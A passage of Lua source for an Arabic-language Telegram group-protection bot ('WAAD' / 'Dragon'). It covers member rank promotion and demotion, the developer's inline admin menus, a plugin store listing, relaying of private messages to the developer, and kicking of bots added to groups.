Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌯︙تم تنزيله ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:del(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrAIAN == "عضو" then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌯︙تم تنزيله ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^رفع (.*) @(.*)") then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if DevAIAN:sismember(WAAD.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrAIAN = DevAIAN:get(WAAD.."Comd:New:rt:AIAN:"..text1[2]..msg.chat_id_)
if mrAIAN == "مميز" and VipMem(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAIAN:sadd(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.id_)
DevAIAN:set(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrAIAN == "ادمن" and Admin(msg) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAIAN:sadd(WAAD..'AIAN:Admins:'..msg.chat_id_, result.id_)
DevAIAN:set(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrAIAN == "مدير" and Manager(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAIAN:sadd(WAAD..'AIAN:Managers:'..msg.chat_id_, result.id_)
DevAIAN:set(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrAIAN == "عضو" then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^تنزيل (.*) @(.*)") then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if DevAIAN:sismember(WAAD.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrAIAN = DevAIAN:get(WAAD.."Comd:New:rt:AIAN:"..text1[2]..msg.chat_id_)
if mrAIAN == "مميز" and VipMem(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.id_)
DevAIAN:del(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrAIAN == "ادمن" and Admin(msg) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.id_)
DevAIAN:del(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrAIAN == "مدير" and Manager(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_, result.id_)
DevAIAN:del(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrAIAN == "عضو" then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
--     Source WAAD     --
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
DevAIAN:incr(WAAD..'AIAN:UsersMsgs'..WAAD..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevAIAN:incr(WAAD..'AIAN:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevAIAN:incr(WAAD..'AIAN:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevAIAN:sismember(WAAD.."AIAN:Users",msg.chat_id_) then
DevAIAN:sadd(WAAD.."AIAN:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
--     Source WAAD     --
if ChatType == 'pv' then 
if text == '/start' or text == 'رجوع ،🔙‘' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⌯︙مرحبا عزيزي المطور \n⌯︙انت المطور الاساسي هنا \n⌯︙اليك ازرار سورس دراكون \n⌯︙تستطيع التحكم بكل الاوامر فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ السورس ⌯','↫ وضع اسم البوت ⌯'},
{'↫ المطورين ⌯','↫ الاحصائيات ⌯'},
{'↫ التفعيل والتعطيل ⌯','↫ الاذاعه ⌯'},
{'↫ تعيين كلايش الاوامر ⌯','↫ العام ⌯','↫ رسالة الستارت ⌯'},
{'↫ الاشتراك الاجباري ⌯','↫ المتجر ⌯'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ تعيين كلايش الاوامر ⌯' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⌯︙اهلا بك مجددا عزيزي المطور \n⌯︙اليك الازرار الخاصه بتعديل وتغيير كلايش سورس دراكون فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تغير معلومات الترحيب ⌯'},
{'حذف كليشة الايدي','تعيين كليشة الايدي'},
{'تعيين امر الاوامر'},
{'تعيين امر م3','تعيين امر م2','تعيين امر م1'},
{'تعيين امر م6','تعيين امر م5','تعيين امر م4'},
{'استعادة كلايش الاوامر'},
{'رجوع ،🔙‘'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ السورس ⌯' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⌯︙اهلا بك مجددا عزيزي المطور \n⌯︙اليك الازرار الخاصه بتحديث  سورس دراكون فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تحديث ⌯'},
--{'↫ تحديث السورس ⌯','↫ تحديث ⌯'},
--{'↫ تصحيح الاخطاء ⌯'},
{'↫ تحديثات دراكون ⌯','↫ السيرفر ⌯'},
{'↫  السورس ⌯','↫ أشتراك البوت ⌯'},
{'رجوع ،🔙‘'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ الاحصائيات ⌯' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⌯︙اهلا بك مجددا عزيزي المطور \n⌯︙اليك الازرار الخاصه ب أحصائيات  سورس دراكون فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫  الاحصائيات ⌯'},
{'↫ المشتركين ⌯','↫ المجموعات ⌯'},
{'↫ روابط المجموعات ⌯','↫ جلب نسخه احتياطيه ⌯'},
{'↫ تنظيف المشتركين ⌯','↫ تنظيف المجموعات ⌯'},
{'رجوع ،🔙‘'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ المطورين ⌯' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⌯︙اهلا بك مجددا عزيزي المطور \n⌯︙اليك الازرار الخاصه ب المطورين لسورس دراكون فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ المطورين  ⌯','↫ الثانويين ⌯'},
{'مسح المطورين','مسح الثانويين'},
{'↫ تغير المطور الاساسي ⌯'},
{'↫ وضع كليشه المطور ⌯'},
{'رجوع ،🔙‘'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ التفعيل والتعطيل ⌯' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⌯︙اهلا بك مجددا عزيزي المطور \n⌯︙اليك الازرار الخاصه ب التفعيل والتعطيل لسورس دراكون فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تعطيل التواصل ⌯','↫ تفعيل التواصل ⌯'},
{'↫ تعطيل ترحيب البوت ⌯','↫ تفعيل ترحيب البوت ⌯'},
{'↫ تعطيل المغادره ⌯','↫ تفعيل المغادره ⌯'},
{'↫ تعطيل الاذاعه ⌯','↫ تفعيل الاذاعه ⌯'},
{'↫ تعطيل البوت الخدمي ⌯','↫ تفعيل البوت الخدمي ⌯'},
{'رجوع ،🔙‘'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ الاذاعه ⌯' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⌯︙اهلا بك مجددا عزيزي المطور \n⌯︙اليك الازرار الخاصه بالاذاعه لسورس دراكون فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ اذاعه بالتثبيت ⌯'},
{'↫ اذاعه خاص ⌯','↫ اذاعه عام ⌯'},
{'↫ اذاعه خاص بالتوجيه ⌯','↫ اذاعه عام بالتوجيه ⌯'},
{'الغاء'},
{'رجوع ،🔙‘'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ العام ⌯' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⌯︙اهلا بك مجددا عزيزي المطور \n⌯︙اليك الازرار الخاصه بالعام لسورس دراكون فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ اضف رد عام ⌯','↫ حذف رد عام ⌯'},
{'↫ الردود العام ⌯','↫ مسح ردود العام ⌯'},
{'↫ قائمه العام ⌯','مسح قائمه العام'},
{'رجوع ،🔙‘'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ رسالة الستارت ⌯' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⌯︙اهلا بك مجددا عزيزي المطور \n⌯︙اليك الازرار الخاصه برسالة الستارت لسورس دراكون فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تعيين رسالة الستارت ⌯','↫ حذف رسالة الستارت ⌯'},
{'↫ جلب رسالة الستارت ⌯'},
{'رجوع ،🔙‘'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ المتجر ⌯' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⌯︙اهلا بك مجددا عزيزي المطور \n⌯︙اليك الازرار الخاصه المتجر الخاص لسورس دراكون فقط اضغط على الملف الذي تريد تفعيل او تعطيله'
local Get_Files, res = https.request("https://raw.githubusercontent.com/CUKURTEAM/Files_WAAD/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n⌯︙قائمة ملفات متجر سورس دراكون\n⌯︙الملفات المتوفره حاليا ↫ ⤈\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n"
local TextE = "ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n⌯︙علامة ↫ (✔) تعني الملف مفعل\n⌯︙علامة ↫ (✖️) تعني الملف معطل\n"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local CheckFileisFound = io.open("Shop_WAAD/"..name,"r")
if CheckFileisFound then
io.close(CheckFileisFound)
CheckFile = "(✔)"
else
CheckFile = "(✖️)"
end
NumFile = NumFile + 1
TextS = TextS.."⌯︙"..Info..' ↫ ⤈\n'..NumFile.."~ : `"..name..'` ↬ '..CheckFile.."\n"
end
local key = {
{'تعطيل ملف AutoFile.lua','تفعيل ملف AutoFile.lua'},
{'تعطيل ملف ReplyBot.lua','تفعيل ملف ReplyBot.lua'},
{'تعطيل ملف TagAll.lua','تفعيل ملف TagAll.lua'},
{'تعطيل ملف ProNames.lua','تفعيل ملف ProNames.lua'},
{'تعطيل ملف TagAdmins.lua','تفعيل ملف TagAdmins.lua'},
{'تعطيل ملف AddedMe.lua','تفعيل ملف AddedMe.lua'},
{'تعطيل ملف ChangeName.lua','تفعيل ملف ChangeName.lua'},
{'تعطيل ملف ChangeUser.lua','تفعيل ملف ChangeUser.lua'},
{'تعطيل ملف ChangePhoto.lua','تفعيل ملف ChangePhoto.lua'},
{'تعطيل ملف MuteNames.lua','تفعيل ملف MuteNames.lua'},
{'رجوع ،🔙‘'},
}
send(msg.chat_id_, msg.id_,Sudo_Welcome)
SendInline(msg.chat_id_,TextS..TextE,key)
return false
end 
else
send(msg.chat_id_, msg.id_,"⌯︙لا يوجد اتصال من الـapi") 
end
end
end
if text == '↫ الاشتراك الاجباري ⌯' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⌯︙اهلا بك مجددا عزيزي المطور \n⌯︙اليك الازرار الخاصه بالاشتراك الاجباري لسورس دراكون فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تعيين قناة الاشتراك ⌯','↫ حذف قناة الاشتراك ⌯'},
{'↫ تعيين كليشه الاشتراك ⌯','↫ حذف كليشه الاشتراك ⌯'},
{'↫ كليشه الاشتراك ⌯','↫ قناة الاشتراك ⌯'},
{'رجوع ،🔙‘'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '/start' and ChCheck(msg) then  
if not DevAIAN:get(WAAD..'AIAN:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=WAAD},function(arg,dp) 
local bot_username = DevAIAN:get(Server_WAAD.."Token_username")
local inline = { 
{{text = "⌯ اضف البوت في مجموعتك .", url="http://t.me/"..bot_username.."?startgroup=start"}}, 
{{text="⌯ المطور .",url="t.me/"..dp.username_ or "S0DRG"},{text="⌯ شراء بوت .",url="t.me/S0DRGbot"}}}
local start = DevAIAN:get(WAAD.."AIAN:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "⌯︙مرحبا انا بوت اسمي "..NameBot.."\n⌯︙اختصاصي حماية المجموعات\n⌯︙من التفليش والسبام والخخ .. . ،\n⌯︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n⌯︙سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
SendInline(msg.chat_id_,Start_Source,nil,inline)
end,nil)
end
DevAIAN:setex(WAAD..'AIAN:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source WAAD     --
if not SecondSudo(msg) and not DevAIAN:sismember(WAAD..'AIAN:Ban:Pv',msg.sender_user_id_) and not DevAIAN:get(WAAD..'AIAN:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=WAAD},function(arg,chat) 
Dev_AIAN(msg.sender_user_id_, msg.id_, 1, '⌯︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "CXRCX")..')', 1, 'md') 
tdcli_function({ID="ForwardMessages",chat_id_=WAAD,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
SendText(WAAD,'⌯︙تم ارسال الملصق من ↫ ⤈\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end
if SecondSudo(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end 
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' or text == 'حضر' then
local Text = '⌯︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n⌯︙تم حظره من التواصل'
SendText(WAAD,Text,msg.id_/2097152/0.5,'md') 
DevAIAN:sadd(WAAD..'AIAN:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '⌯︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n⌯︙تم الغاء حظره من التواصل'
SendText(WAAD,Text,msg.id_/2097152/0.5,'md') 
DevAIAN:srem(WAAD..'AIAN:Ban:Pv',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو قام بحظر البوت لا تستطيع ارسال الرسائل له', 1, 'md')
return false  
end 
if text then
Dev_AIAN(id_user, 0, 1, text, 1, "md")  
Text = '⌯︙تم ارسال الرساله الى ↫ ⤈'
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = '⌯︙تم ارسال الملصق الى ↫ ⤈'
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = '⌯︙تم ارسال الصوره الى ↫ ⤈'
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = '⌯︙تم ارسال المتحركه الى ↫ ⤈'
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = '⌯︙تم ارسال البصمه الى ↫ ⤈'
end     
SendText(WAAD, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);
end,nil);
end,nil);
end,nil);
end 
end 
--     Source WAAD     --
if text and DevAIAN:get(WAAD..'AIAN:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevAIAN:del(WAAD..'AIAN:Start:Bots'..msg.sender_user_id_) 
return false
end
DevAIAN:set(WAAD.."AIAN:Start:Bot",text)  
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم حفظ كليشة الستارت', 1, 'md')
DevAIAN:del(WAAD..'AIAN:Start:Bots'..msg.sender_user_id_) 
return false
end
if SecondSudo(msg) then
if text == 'تعيين رد الخاص' or text == 'ضع كليشه ستارت' or text == '↫ تعيين رد الخاص ⌯' or text == 'تعيين رسالة الستارت' or text == '↫ تعيين رسالة الستارت ⌯' then 
DevAIAN:set(WAAD..'AIAN:Start:Bots'..msg.sender_user_id_,true) 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙ارسل لي كليشة الستارت الان', 1, 'md')
return false
end
if text == 'حذف رد الخاص' or text == 'حذف كليشه ستارت' or text == '↫ حذف رد الخاص ⌯' or text == 'حذف رسالة الستارت' or text == '↫ حذف رسالة الستارت ⌯' then 
DevAIAN:del(WAAD..'Start:Bot') 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم حذف كليشة الستارت بنجاح', 1, 'md')
end
if text == 'جلب رد الخاص' or text == 'جلب رسالة الستارت' or text == '↫ جلب رسالة الستارت ⌯' then  
local start = DevAIAN:get(WAAD.."AIAN:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "⌯︙مرحبا انا بوت اسمي "..NameBot.."\n⌯︙اختصاصي حماية المجموعات\n⌯︙من التفليش والسبام والخخ .. . ،\n⌯︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n⌯︙سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
Dev_AIAN(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end
if text == 'تفعيل التواصل' or text == '↫ تفعيل التواصل ⌯' then   
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل التواصل بنجاح\n✓")
DevAIAN:del(WAAD..'AIAN:Texting:Pv') 
end
if text == 'تعطيل التواصل' or text == '↫ تعطيل التواصل ⌯' then  
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل التواصل بنجاح\n✓")
DevAIAN:set(WAAD..'AIAN:Texting:Pv',true) 
end
end
--     Source WAAD     --
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then 
DevAIAN:incr(WAAD..'AIAN:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevAIAN:set(WAAD.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevAIAN:get(WAAD.."AIAN:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "kick" and not VipMem(msg) then   
https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "del" and not VipMem(msg) then   
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "ked" and not VipMem(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
DevAIAN:sadd(WAAD..'AIAN:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(WAAD) then 
DevAIAN:srem(WAAD.."AIAN:Groups", msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
if not Sudo(msg) and not Bot(msg) then
SendText(WAAD,"⌯︙تم طرد البوت من المجموعه ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙بواسطة ↫ "..Name.."\n⌯︙اسم المجموعه ↫ ["..NameChat.."]\n⌯︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙الوقت ↫ "..os.date("%I:%M%p").."\n⌯︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
